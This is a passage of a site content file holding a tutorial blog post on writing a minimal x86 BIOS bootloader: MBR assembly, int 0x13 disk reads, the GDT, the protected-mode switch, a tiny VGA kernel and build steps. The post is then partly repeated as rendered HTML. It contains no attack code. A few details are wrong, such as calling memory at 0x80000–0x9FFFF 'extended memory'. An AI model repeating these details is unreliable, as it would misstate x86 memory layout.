stack.\r\n\r\nSomeone at IBM decided on `0x7C00` and now, 40+ years later, we're still using it. Every x86 CPU boots the same way. Backward compatibility is a hell of a drug.\r\n\r\n### Why 512 Bytes?\r\n\r\nBecause that's how big a disk sector is. Or rather, that's how big disk sectors were on floppy disks in 1981. The BIOS reads one sector, and one sector is 512 bytes. Modern drives use larger sectors (often 4KB), but they emulate 512-byte sectors for compatibility.\r\n\r\nThat `0xAA55` magic number in the last two bytes is how the BIOS knows you're actually a boot sector and not just random data that happened to be on the disk.\r\n\r\n##  The Master Boot Record\r\n\r\nLet's look at `master_boot_record.asm` line by line:\r\n\r\n```asm\r\n[bits 16]\r\n```\r\n\r\nThis tells NASM (the assembler) to generate 16-bit code. When the CPU starts, it's in real mode, which is the 16-bit mode that the original 8086 had in 1978. Even modern 64-bit CPUs start in this mode for compatibility.\r\n\r\n```asm\r\norg 0x7c00\r\n```\r\n\r\nThis is imp. The `org` directive tells the assembler \"assume this code will be loaded at address 0x7c00\". Without this, all your memory references would be wrong. If you write `jmp label`, the assembler needs to know where `label` will actually be in memory. It calculates offsets based on the `org` address.\r\n\r\n```asm\r\nKernel_offset equ 0x1000\r\n```\r\n\r\nWe're going to load our kernel to address `0x1000` (4KB). Why there? Because it's far enough from our bootloader (which ends at `0x7e00`) and far enough from the BIOS data area (which ends around `0x500`). There's nothing scientific about `0x1000` - it's just a nice round number in the free region.\r\n\r\n```asm\r\nmov [BOOT_DRIVE], dl\r\n```\r\n\r\nWhen the BIOS jumps to your code, it puts the boot drive number in the `dl` register. `0x00` for the first floppy, `0x80` for the first hard drive, etc. We save this immediately because we'll need it later to read more sectors from the same drive.\r\n\r\n```asm\r\nmov bp, 0x900\r\nmov sp, bp\r\n```\r\n\r\nSetting up the stack. The stack grows downward, so we set the base pointer (`bp`) and stack pointer (`sp`) to `0x900`. This gives us a stack from `0x900` down to wherever the BIOS data ends (around `0x500`). That's about 1KB of stack space, which is plenty for our bootloader.\r\n\r\nWhy `0x900`? Again, it's in the free region. Below our code at `0x7c00`, above the BIOS data. Could be `0x800` or `0xa00` - doesn't really matter as long as it doesn't overlap with anything else.\r\n\r\n```asm\r\ncall load_kernel\r\ncall switch_2_32bit\r\n```\r\n\r\nHere's where we do the actual work. First, load more code from disk. Second, switch to 32-bit mode. \r\n\r\n```asm\r\njmp $\r\n```\r\n\r\n\"Jump to current address\" - an infinite loop. If we get here, something went wrong. This prevents the CPU from running off into random memory and executing garbage as instructions.\r\n\r\n```asm\r\n%include \"disk.asm\"\r\n%include \"gdt.asm\"\r\n%include \"switch2_32bit.asm\"\r\n```\r\n\r\nNASM literally copy-pastes these files here. It's not like C includes - there's no separate compilation. The assembler just reads these files and inserts their contents at this point.\r\n\r\n```asm\r\n[bits 16]\r\n\r\nload_kernel:\r\n    mov bx, Kernel_offset\r\n    mov dh, 2\r\n    mov dl, [BOOT_DRIVE]\r\n    call disk_load\r\n    ret\r\n```\r\n\r\nThis sets up the parameters for `disk_load` and calls it. We want to load 2 sectors (`dh = 2`) from the boot drive to address `0x1000` (`bx = Kernel_offset`). Why 2 sectors? Because our kernel is small. If it were bigger, we'd load more.\r\n\r\n```asm\r\n[bits 32]\r\n\r\nBEGIN_32BIT:\r\n    call Kernel_offset\r\n    jmp $\r\n```\r\n\r\nThis code runs after we've switched to 32-bit mode. Note the `[bits 32]` directive - now we're generating 32-bit instructions. We call the kernel (which is now loaded at `0x1000`), and if it ever returns (it shouldn't), we loop forever.\r\n\r\n```asm\r\nBOOT_DRIVE db 0\r\n```\r\n\r\nStorage for the boot drive number. `db` means \"define byte\" - reserve one byte of space, initialized to 0.\r\n\r\n```asm\r\ntimes 510 - ($-$$) db 0\r\n```\r\n\r\nThis is some assembler stuff. `$` is the current address, `$$` is the start of the section. So `($-$$)` is how many bytes we've used so far. `510 - ($-$$)` is how many bytes we have left (out of 512 total, minus 2 for the magic number). `times` repeats the following instruction that many times. So this pads with zeros until we reach byte 510.\r\n\r\n```asm\r\ndw 0xaa55\r\n```\r\n\r\nThe magic number. `dw` means \"define word\" (2 bytes). This writes `0x55 0xaa` (little-endian) at bytes 510-511. The BIOS checks for this and won't boot if it's not there.\r\n\r\n## Deep Dive: Reading From Disk\r\n\r\n[CPU Registers x86 - CR0 Documentation](https://wiki.osdev.org/CPU_Registers_x86#CR0)\r\n\r\nThe `disk.asm` file uses BIOS interrupt 0x13 to read sectors from disk. Interrupts are the way you communicate with the BIOS in real mode. You set up registers with parameters, call `int 0x13`, and the BIOS does the work.\r\n\r\n```asm\r\ndisk_load:\r\n    pusha\r\n    push dx\r\n```\r\n\r\nSave all registers. BIOS interrupts might clobber them, and we want to restore the state afterward. `pusha` pushes all general-purpose registers at once.\r\n\r\n```asm\r\nmov ah, 0x02\r\n```\r\n\r\nFunction 0x02 of interrupt 0x13 is \"read sectors\". The function number goes in `ah`. Different values of `ah` do different things (0x00 resets the disk controller, 0x03 writes sectors, etc.).\r\n\r\n```asm\r\nmov al, dh\r\n```\r\n\r\nNumber of sectors to read. We put this in `dh` before calling, now move it to `al` where the BIOS expects it.\r\n\r\n```asm\r\nmov cl, 0x02\r\n```\r\n\r\nStart reading from sector 2. Sector numbers start at 1 (not 0, because of course they don't). Sector 1 is our boot sector, so sector 2 is where our kernel starts.\r\n\r\n```asm\r\nmov ch, 0x00\r\nmov dh, 0x00\r\n```\r\n\r\nCylinder 0, head 0. On modern drives, these don't really correspond to physical geometry anymore, but the BIOS interface still uses this CHS (Cylinder-Head-Sector) addressing. For small bootloaders, we can just use cylinder 0, head 0 and increment sectors.\r\n\r\n```asm\r\nint 0x13\r\n```\r\n\r\nCall the BIOS. This actually reads from the disk into memory at `es:bx`. We have `bx` set to our kernel offset, and `es` defaults to 0, so we're reading to `0x0000:0x1000` which is just `0x1000`.\r\n\r\n```asm\r\njc disk_error\r\n```\r\n\r\nJump if carry flag is set. The BIOS sets the carry flag if an error occurred. We'd jump to an error handler (which in our case is just an infinite loop).\r\n\r\n```asm\r\npop dx\r\ncmp al, dh\r\njne sector_error\r\n```\r\n\r\nThe BIOS returns the number of sectors actually read in `al`. We compare it to how many we expected (`dh`, which we saved on the stack). If they don't match, something went wrong.\r\n\r\n```asm\r\npopa\r\nret\r\n```\r\n\r\nRestore registers and return. If u made it here, the kernel is loaded into memory.\r\n\r\n##  The Global Descriptor Table\r\n\r\nBefore we can switch to protected mode, we need to set up the GDT..\r\n\r\n### Memory Segmentation: Why?\r\n\r\n![Memory Segmentation](/images/posts/bootloader/4.gif)\r\n\r\n[Global Descriptor Table - Wikipedia](https://en.wikipedia.org/wiki/Global_Descriptor_Table)\r\n\r\n[Segment Descriptor - Wikipedia](https://en.wikipedia.org/wiki/Segment_descriptor)\r\n\r\nIn real mode, memory addresses work like this: `segment:offset`. You have a 16-bit segment register and a 16-bit offset. The actual physical address is `(segment \u003C\u003C 4) + offset`. This lets you address 1MB of memory (20 bits) with 16-bit registers.\r\n\r\nIn protected mode, segments work differently. Instead of shifting and adding, the segment register contains an index into the GDT. Each GDT entry describes a segment: base address, limit, access rights, privilege level.\r\n\r\nThis gives you:\r\n- **Memory protection** - Segments can be marked as read-only, executable, etc.\r\n- **Privilege levels** - Ring 0 (kernel) vs Ring 3 (user programs)\r\n- **More address space** - Base can be 32-bit, limit can be up to 4GB\r\n\r\nFor our simple bootloader, we're going to set up flat segmentation: one code segment and one data segment, both covering the entire 4GB address space. This is what modern OSes do - real segmentation is basically unused on x86-64. We set it up because the CPU requires it, then ignore it and use paging instead.\r\n\r\n### GDT Structure\r\n\r\n```asm\r\ngdt_start:\r\n    dq 0x0\r\n```\r\n\r\nThe first entry must be null. This is a requirement. Any attempt to load a segment register with 0 will cause a fault. It's a safety feature - if you accidentally use an uninitialized segment register, you get a clear error instead of random behavior.\r\n\r\n```asm\r\ngdt_code:\r\n    dw 0xffff    ; Segment limit, bits 0-15\r\n    dw 0x0       ; Base address, bits 0-15\r\n    db 0x0       ; Base address, bits 16-23\r\n    db 10011010b ; Access byte\r\n    db 11001111b ; Flags and limit bits 16-19\r\n    db 0x0       ; Base address, bits 24-31\r\n```\r\n\r\nA GDT entry is 8 bytes. The layout is weird because of historical reasons (the original 80286 had a different format, and they extended it for 32-bit while keeping backward compatibility). Let's break down that access byte:\r\n\r\n```\r\n10011010b\r\n│││││││└─ Accessed bit (CPU sets this when segment is accessed)\r\n││││││└── Readable (for code) / Writable (for data)\r\n│││││└─── Executable (1 = code segment, 0 = data segment)\r\n││││└──── Must be 1\r\n│││└───── Privilege level (0-3, we use 0 for kernel)\r\n││└────── Privilege level\r\n300: │└─────── Present bit (must be 1)\r\n```\r\n\r\nSo `10011010b` means: present, privilege 0, must-be-1, executable, readable, not accessed yet.\r\n\r\nThe flags byte is split:\r\n\r\n```\r\n11001111b\r\n││││└┴┴┴─ Limit bits 16-19\r\n│││└───── Available for OS use\r\n││└────── Must be 0 (for 32-bit segments)\r\n│└─────── Size (1 = 32-bit, 0 = 16-bit)\r\n└──────── Granularity (1 = limit is in 4KB blocks)\r\n```\r\n\r\nSo `11001111b` means: granularity=1 (4KB blocks), 32-bit, limit bits are all 1. With granularity set and limit=`0xfffff`, this gives us a 4GB segment (`0xfffff * 4KB = 4GB`).\r\n\r\nThe data segment is similar, just with `10010010b` as the access byte (not executable, writable).\r\n\r\n```asm\r\ngdt_descriptor:\r\n    dw gdt_end - gdt_start - 1\r\n    dd gdt_start\r\n```\r\n\r\nThis is the GDT descriptor that we load with `lgdt`. It's 6 bytes: 2-byte size (total bytes minus 1), 4-byte address of the GDT. The CPU needs this to know where the GDT is and how big it is.\r\n\r\n```asm\r\nCODE_SEG equ gdt_code - gdt_start\r\nDATA_SEG equ gdt_data - gdt_start\r\n```\r\n\r\nThese calculate offsets to our segments. `CODE_SEG` is 8 (first entry after null), `DATA_SEG` is 16. These are segment selectors - when we load `CODE_SEG` into a segment register, the CPU looks at GDT entry 8.\r\n\r\n##  Switching to Protected Mode\r\n\r\n![Switching to Protected Mode](/images/posts/bootloader/5.gif)\r\n\r\nThis is the climax ehe .  We're going to flip one bit in a control register, and the CPU will completely change how it operates.\r\n\r\n```asm\r\n[bits 16]\r\n\r\nswitch_2_32bit:\r\n    cli\r\n```\r\n\r\nClear interrupts. BIOS interrupts don't work in protected mode, and we haven't set up our own interrupt handlers yet. If an interrupt fires during the transition, bad things happen. So we disable them.\r\n\r\n```asm\r\nlgdt [gdt_descriptor]\r\n```\r\n\r\nLoad the GDT. This tells the CPU \"here's your new segmentation table\". The CPU doesn't start using it yet - we're still in real mode - but it needs to be loaded before we switch.\r\n\r\n```asm\r\nmov eax, cr0\r\nor eax, 0x1\r\nmov cr0, eax\r\n```\r\n\r\nHere it is. Control register 0 has a bunch of flags. Bit 0 is PE (Protection Enable). Setting it switches the CPU to protected mode. We read CR0, set bit 0, write it back. The instant that `mov cr0, eax` executes, we're in 32-bit protected mode.\r\n\r\n```asm\r\njmp CODE_SEG:init_32bit\r\n```\r\n\r\nThis is a far jump. It does two things:\r\n\r\n1. Loads `CS` (code segment) with `CODE_SEG`, making the CPU actually start using our GDT\r\n2. Flushes the instruction pipeline\r\n\r\nThe CPU prefetches instructions. Right now the pipeline has 16-bit instructions that were fetched before we switched modes. If we kept executing, we'd be trying to execute 16-bit instructions in 32-bit mode. This causes instant crashes. The far jump clears the pipeline and forces the CPU to refetch from the new address, now interpreting everything as 32-bit code.\r\n\r\n```asm\r\n[bits 32]\r\n\r\ninit_32bit:\r\n    mov ax, DATA_SEG\r\n    mov ds, ax\r\n    mov ss, ax\r\n    mov es, ax\r\n    mov fs, ax\r\n    mov gs, ax\r\n```\r\n\r\nLoad all segment registers with our data segment. In protected mode, you can't use segments that aren't in the GDT. We load them all with `DATA_SEG` so memory accesses work correctly.\r\n\r\n```asm\r\nmov ebp, 0x90000\r\nmov esp, ebp\r\n```\r\n\r\nSet up a new stack. We use `0x90000` (576KB) which is well into extended memory. We need a bigger stack now because we might be doing more complex things. The old stack was in the first 1MB, which is fine but cramped.\r\n\r\n```asm\r\ncall BEGIN_32BIT\r\n```\r\n\r\nJump back to the MBR, which has a `BEGIN_32BIT` label that calls our kernel. We've made it. We're running 32-bit code.\r\n\r\n## The Kernel \r\n\r\n![The Kernel](/images/posts/bootloader/kernel.png)\r\n\r\n```c\r\nvoid main() {\r\n    char* video = (char*) 0xb8000;\r\n    *video = 'X';\r\n}\r\n```\r\n\r\nThis is possibly the simplest kernel in existence. \r\n\r\n`0xb8000` is the start of VGA text mode video memory. In text mode (which is what the BIOS sets up), the screen is 80x25 characters. Each character takes 2 bytes: one for the ASCII code, one for the attribute (color).\r\n\r\nBy writing `'X'` to `0xb8000`, we put 'X' in the top-left corner of the screen. The default color is light gray on black, so you'll see a light gray X.\r\n\r\nIf you wanted to make it red:\r\n\r\n```c\r\nchar* video = (char*) 0xb8000;\r\n*video = 'X';\r\n*(video + 1) = 0x04;  // Red on black\r\n```\r\n\r\nThe attribute byte is `0x04` for red foreground, black background. The low nibble is foreground, high nibble is background.\r\n\r\nTo write a string:\r\n\r\n```c\r\nchar* video = (char*) 0xb8000;\r\nchar* message = \"Hello, World!\";\r\nint i = 0;\r\nwhile (message[i] != 0) {\r\n    video[i*2] = message[i];\r\n    video[i*2 + 1] = 0x0F;  // White on black\r\n    i++;\r\n}\r\n```\r\n\r\nNo `printf`. No standard library. Just raw memory writes. That's what \"freestanding\" means - no hosted environment, no runtime support. Just you and the hardware.\r\n\r\n\r\n\r\n## The Memory Map: Where Everything Lives\r\n\r\nHere's what our memory looks like after loading:\r\n\r\n```\r\n0x00000 - 0x003FF   Real Mode IVT (Interrupt Vector Table) - unused in protected mode\r\n0x00400 - 0x004FF   BIOS Data Area\r\n0x00500 - 0x006FF   Free (can use for bootloader data)\r\n0x00700 - 0x008FF   Free\r\n0x00900 - 0x00900   Our bootloader stack (grows down from here)\r\n0x007C00 - 0x007DFF Our MBR (loaded by BIOS)\r\n0x007E00 - 0x00FFF  Free\r\n0x01000 - 0x01FFF   Our kernel (loaded by MBR)\r\n0x02000 - 0x7FFFF   Free (conventional memory)\r\n0x80000 - 0x9FFFF   Extended memory (free)\r\n0xA0000 - 0xBFFFF   Video memory\r\n0xC0000 - 0xFFFFF   BIOS ROM\r\n```\r\n\r\nThe first megabyte is called conventional memory. Above that is extended memory, which requires protected mode to access. That's one reason we switch to protected mode - we want all 4GB of address space, not just 1MB.\r\n\r\n## Building This Thing\r\n\r\n![Building Process](/images/posts/bootloader/build.png)\r\n\r\nThe Makefile orchestrates the build:\r\n\r\n1. **Assemble the MBR**: `nasm -f bin master_boot_record.asm -o master_boot_record.bin`\r\n   - `-f bin` means output raw binary (not an object file)\r\n   - This produces exactly 512 bytes\r\n\r\n2. **Compile the kernel**: `gcc -m32 -ffreestanding -fno-pie -c kernel.c -o kernel.o`\r\n   - `-m32` targets 32-bit x86\r\n   - `-ffreestanding` says we're not hosted (no libc)\r\n   - `-fno-pie` disables position-independent code\r\n   - `-c` compiles but doesn't link\r\n\r\n3. **Link the kernel**: `ld -m elf_i386 -Ttext 0x1000 --oformat binary kernel.o -o kernel.bin`\r\n   - `-Ttext 0x1000` means \"put the code at address 0x1000\"\r\n   - `--oformat binary` outputs raw binary (not ELF)\r\n   - This strips all the ELF headers - we just want machine code\r\n\r\n4. **Concatenate**: `cat master_boot_record.bin kernel.bin > os-image.bin`\r\n   - This creates a disk image: 512 bytes of MBR, then kernel\r\n   - When BIOS loads sector 1, it gets the MBR\r\n   - When the MBR loads sector 2+, it gets the kernel\r\n\r\nThe final `os-image.bin` is what you'd write to a USB drive or floppy disk to make a bootable device. QEMU can boot from it directly.\r\n\r\n## Running and Testing\r\n\r\n```bash\r\nmake run\r\n```\r\n\r\nThis fires up QEMU with your image. You should see a black screen with a single 'X' in the top-left corner. That's your operating system.\r\n\r\n## A Note on Modern Systems\r\n\r\n\r\nEverything in this document assumes legacy BIOS boot. Modern systems use UEFI, which is completely different:\r\n\r\n- No 16-bit real mode\r\n- PE32+ executables instead of raw binary\r\n- FAT filesystem required\r\n- Boot services API instead of BIOS interrupts\r\n- Secure Boot signature verification\r\n\r\nUEFI is technically superior - better architecture, more features, no 40-year-old cruft. But it's also more complex and less educational. Legacy BIOS boot teaches you what's actually happening at the CPU level. UEFI hides that behind abstraction layers.\r\n\r\nMost computers still support \"Legacy Boot\" or \"CSM\" (Compatibility Support Module) mode. Enable that in BIOS settings if you want to test this bootloader on real hardware.\r\n\r\nFor learning, start with BIOS. Understand the fundamentals. Then tackle UEFI when you know what problems it's solving.\r\n\r\n\r\n\r\n## Final Thoughts\r\n\r\n You've written code that runs on bare metal, with no OS underneath. You've talked directly to the CPU, set up memory segmentation, switched processor modes. This is as low-level as programming gets (well, except for writing microcode or designing CPUs, but that's a different kind of low-level).\r\n\r\n## Appendix: Quick Reference\r\n\r\n### NASM Directives\r\n\r\n```asm\r\norg 0x7c00          ; Set origin address\r\nbits 16             ; Generate 16-bit code\r\nbits 32             ; Generate 32-bit code\r\n%include \"file.asm\" ; Include another file\r\ndb 0x00             ; Define byte\r\ndw 0x0000           ; Define word (2 bytes)\r\ndd 0x00000000       ; Define double word (4 bytes)\r\ndq 0x0000000000000000 ; Define quad word (8 bytes)\r\ntimes 10 db 0       ; Repeat instruction 10 times\r\n$                   ; Current address\r\n$$                  ; Section start address\r\nequ                 ; Define constant\r\n```\r\n\r\n### x86 Registers (32-bit)\r\n\r\n```\r\nEAX, EBX, ECX, EDX  ; General purpose\r\nESI, EDI            ; Source/Destination index\r\nEBP, ESP            ; Base/Stack pointer\r\nEIP                 ; Instruction pointer\r\nCS, DS, ES, FS, GS, SS ; Segment registers\r\nCR0, CR2, CR3, CR4  ; Control registers\r\n```\r\n\r\n### Common Instructions\r\n\r\n```asm\r\nmov dest, src       ; Move data\r\nadd dest, src       ; Add\r\nsub dest, src       ; Subtract\r\nand dest, src       ; Bitwise AND\r\nor dest, src        ; Bitwise OR\r\nxor dest, src       ; Bitwise XOR\r\npush src            ; Push onto stack\r\npop dest            ; Pop from stack\r\ncall label          ; Call function\r\nret                 ; Return from function\r\njmp label           ; Unconditional jump\r\nje label            ; Jump if equal\r\njne label           ; Jump if not equal\r\njc label            ; Jump if carry\r\njnc label           ; Jump if not carry\r\ncmp op1, op2        ; Compare (sets flags)\r\nint 0x13            ; Software interrupt\r\ncli                 ; Clear interrupts\r\nsti                 ; Set interrupts\r\nlgdt [address]      ; Load GDT\r\n```\r\n\r\n### BIOS Interrupts (Real Mode Only)\r\n\r\n```\r\nint 0x10            ; Video services\r\n  ah=0x00           ; Set video mode\r\n  ah=0x0e           ; Teletype output (print char)\r\n\r\nint 0x13            ; Disk services\r\n  ah=0x00           ; Reset disk controller  \r\n  ah=0x02           ; Read sectors\r\n  ah=0x03           ; Write sectors\r\n\r\nint 0x16            ; Keyboard services\r\n  ah=0x00           ; Read keystroke\r\n  ah=0x01           ; Check for keystroke\r\n```\r\n\r\n### Useful Memory Addresses\r\n\r\n```\r\n0x7C00              ; Boot sector load address\r\n0xB8000             ; VGA text mode video memory\r\n0x0000-0x03FF       ; Real mode IVT\r\n0x0400-0x04FF       ; BIOS data area\r\n```\r\n\r\n### GDT Access Byte Format\r\n\r\n```\r\nBit 7: Present (must be 1)\r\nBit 6-5: Privilege level (0=kernel, 3=user)\r\nBit 4: Descriptor type (1=code/data, 0=system)\r\nBit 3: Executable (1=code, 0=data)\r\nBit 2: Direction/Conforming\r\nBit 1: Readable (code) / Writable (data)\r\nBit 0: Accessed (set by CPU)\r\n```\r\n\r\n\r\nThat's everything. Now go build something.\r\n\r\n---\r\n\r\n**Check out the full source code on GitHub:** [mooofin/SoftBoot](https://github.com/mooofin/SoftBoot)","src/content/blog/bootloader.md","6853110c4142dabd",{"html":782,"metadata":783},"\u003Ch1 id=\"building-a-bootloader-from-scratch-a-deep-dive-into-x86-boot-process\">Building a Bootloader from Scratch: A Deep Dive into x86 Boot Process\u003C/h1>\n\u003Cp>\u003Cimg src=\"/images/posts/bootloader/intro.png\" alt=\"Bootloader Introduction\">\u003C/p>\n\u003Cp>So you want to understand how computers actually boot? Not the handwavy “BIOS loads the OS” explanation, but the real, low-level mechanics of what happens when you hit the power button? Good\u003C/p>\n\u003Cp>This project is a minimal but complete bootloader that takes you from the moment the CPU starts executing at power-on, through loading code from disk, setting up memory segmentation, switching processor modes, and finally running C code. It’s about 100 lines of assembly and 5 lines of C .\u003C/p>\n\u003Ch2 id=\"the-problem-were-solving\">The Problem We’re Solving\u003C/h2>\n\u003Cp>Modern operating systems are complicated beasts. Linux is millions of lines of code. Windows is even more. But they all start the same way: with 512 bytes of code loaded by the BIOS at a specific memory address. That’s it\u003C/p>\n\u003Cp>Those 512 bytes need to:\u003C/p>\n\u003Cul>\n\u003Cli>Set up a working environment\u003C/li>\n\u003Cli>Load more code from disk (because 512 bytes isn’t enough for anything useful)\u003C/li>\n\u003Cli>Switch the CPU from 1981 compatibility mode into something resembling modern computing\u003C/li>\n\u003Cli>Transfer control to your actual operating system\u003C/li>\n\u003C/ul>\n\u003Cp>The bootloader presented here is the smallest practical path from power-on to executing C code. It relies solely on handwritten x86 assembly interacting directly with the CPU and BIOS, deliberately avoiding any external boot infrastructure.\u003C/p>\n\u003Ch1 id=\"why\">WHY\u003C/h1>\n\u003Cp>\u003Cimg src=\"/images/posts/bootloader/2.gif\" alt=\"Why Learn This\">\u003C/p>\n\u003Cp>Most modern development never gets anywhere near this layer, and the system is usually content to keep its earliest steps politely out of sight. Still, understanding those first instructions changes how the rest of the stack makes sense.\u003C/p>\n\u003Cp>Working at this level forces you to confront how memory behaves in physical terms. Not heap allocators and convenient abstractions, but real addresses, segmentation rules, and the structures that determine how the processor interprets space.\u003C/p>\n\u003Cp>It also replaces the idea of a “virtual” machine with the one that actually exists.\u003C/p>\n\u003Ch2 id=\"the-boot-process-what-actually-happens\">The Boot Process: What Actually Happens\u003C/h2>\n\u003Ch3 id=\"power-on\">Power On\u003C/h3>\n\u003Cp>When you press the power button, here’s what happens:\u003C/p>\n\u003Col>\n\u003Cli>\u003Cstrong>Power supply stabilizes\u003C/strong> - Takes a few milliseconds\u003C/li>\n\u003Cli>\u003Cstrong>CPU reset line goes high\u003C/strong> - CPU starts executing\u003C/li>\n\u003Cli>\u003Cstrong>CPU jumps to firmware\u003C/strong> - On x86, this is address \u003Ccode>0xFFFFFFF0\u003C/code> (yes, near the top of the 32-bit address space)\u003C/li>\n\u003Cli>\u003Cstrong>BIOS/UEFI runs\u003C/strong> - Checks hardware, runs POST (Power-On Self Test)\u003C/li>\n\u003Cli>\u003Cstrong>BIOS looks for boot device\u003C/strong> - Checks floppy, hard drive, CD-ROM, USB, network, whatever boot order you set\u003C/li>\n\u003Cli>\u003Cstrong>BIOS reads first sector\u003C/strong> - Takes 512 bytes from sector 0 of the boot device\u003C/li>\n\u003Cli>\u003Cstrong>BIOS checks magic number\u003C/strong> - Last two bytes must be \u003Ccode>0x55 0xAA\u003C/code> (little-endian for \u003Ccode>0xAA55\u003C/code>)\u003C/li>\n\u003Cli>\u003Cstrong>If valid, BIOS loads it to 0x7C00\u003C/strong> - This address is hardcoded in the BIOS\u003C/li>\n\u003Cli>\u003Cstrong>BIOS jumps to 0x7C00\u003C/strong> - Your code is now running!\u003C/li>\n\u003C/ol>\n\u003Cp>At this point, you’re executing in 16-bit real mode, you have access to BIOS interrupts, and you have 512 bytes to do something useful.\u003C/p>\n\u003Ch3 id=\"why-0x7c00\">Why 0x7C00?\u003C/h3>\n\u003Cp>\u003Cimg src=\"/images/posts/bootloader/3.gif\" alt=\"Why 0x7C00\">\u003C/p>\n\u003Cp>This is one of those historical quirks. The original IBM PC had 32KB of RAM. The BIOS used the first section for its data structures and interrupt vectors. The boot sector needed to be high enough to not conflict with BIOS data, but low enough to leave space for the boot program to set up a stack.\u003C/p>\n\u003Cp>Someone at IBM decided on \u003Ccode>0x7C00\u003C/code> and now, 40+ years later, we’re still using it. Every x86 CPU boots the same way. Backward compatibility is a hell of a drug.\u003C/p>\n\u003Ch3 id=\"why-512-bytes\">Why 512 Bytes?\u003C/h3>\n\u003Cp>Because that’s how big a disk sector is. Or rather, that’s how big disk sectors were on floppy disks in 1981. The BIOS reads one sector, and one sector is 512 bytes. Modern drives use larger sectors (often 4KB), but they emulate 512-byte sectors for compatibility.\u003C/p>\n\u003Cp>That \u003Ccode>0xAA55\u003C/code> magic number in the last two bytes is how the BIOS knows you’re actually a boot sector and not just random data that happened to be on the disk.\u003C/p>\n\u003Ch2 id=\"the-master-boot-record\">The Master Boot Record\u003C/h2>\n\u003Cp>Let’s look at \u003Ccode>master_boot_record.asm\u003C/code> line by line:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"asm\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">[bits \u003C/span>\u003Cspan style=\"color:#79B8FF\">16\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>This tells NASM (the assembler) to generate 16-bit code. When the CPU starts, it’s in real mode, which is the 16-bit mode that the original 8086 had in 1978. Even modern 64-bit CPUs start in this mode for compatibility.\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"asm\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">org \u003C/span>\u003Cspan style=\"color:#79B8FF\">0x7c00\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>This is imp. The \u003Ccode>org\u003C/code> directive tells the assembler “assume this code will be loaded at address 0x7c00”. Without this, all your memory references would be wrong. If you write \u003Ccode>jmp label\u003C/code>, the assembler needs to know where \u003Ccode>label\u003C/code> will actually be in memory. It calculates offsets based on the \u003Ccode>org\u003C/code> address.\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"asm\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">Kernel_offset \u003C/span>\u003Cspan style=\"color:#79B8FF\">equ\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0x1000\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>We’re going to load our kernel to address \u003Ccode>0x1000\u003C/code> (4KB). Why there? Because it’s far enough from our bootloader (which ends at \u003Ccode>0x7e00\u003C/code>) and far enough from the BIOS data area (which ends around \u003Ccode>0x500\u003C/code>). There’s nothing scientific about \u003Ccode>0x1000\u003C/code> - it’s just a nice round number in the free region.\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"asm\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">mov\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> [BOOT_DRIVE], \u003C/span>\u003Cspan style=\"color:#79B8FF\">dl\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>When the BIOS jumps to your code, it puts the boot drive number in the \u003Ccode>dl\u003C/code> register. \u003Ccode>0x00\u003C/code> for the first floppy, \u003Ccode>0x80\u003C/code> for the first hard drive, etc. We save this immediately because we’ll need it later to read more sectors from the same drive.\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"asm\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">mov\u003C/span>\u003Cspan style=\"color:#79B8FF\"> bp\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#79B8FF\">0x900\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">mov\u003C/span>\u003Cspan style=\"color:#79B8FF\"> sp\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#79B8FF\">bp\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Setting up the stack. The stack grows downward, so we set the base pointer (\u003Ccode>bp\u003C/code>) and stack pointer (\u003Ccode>sp\u003C/code>) to \u003Ccode>0x900\u003C/code>. This gives us a stack from \u003Ccode>0x900\u003C/code> down to wherever the BIOS data ends (around \u003Ccode>0x500\u003C/code>). That’s about 1KB of stack space, which is plenty for our bootloader.\u003C/p>\n\u003Cp>Why \u003Ccode>0x900\u003C/code>? Again, it’s in the free region. Below our code at \u003Ccode>0x7c00\u003C/code>, above the BIOS data. Could be \u003Ccode>0x800\u003C/code> or \u003Ccode>0xa00\u003C/code> - doesn’t really matter as long as it doesn’t overlap with anything else.\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"asm\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">call\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> load_kernel\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">call\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> switch_2_32bit\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Here’s where we do the actual work. First, load more code from disk. Second, switch to 32-bit mode.\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" 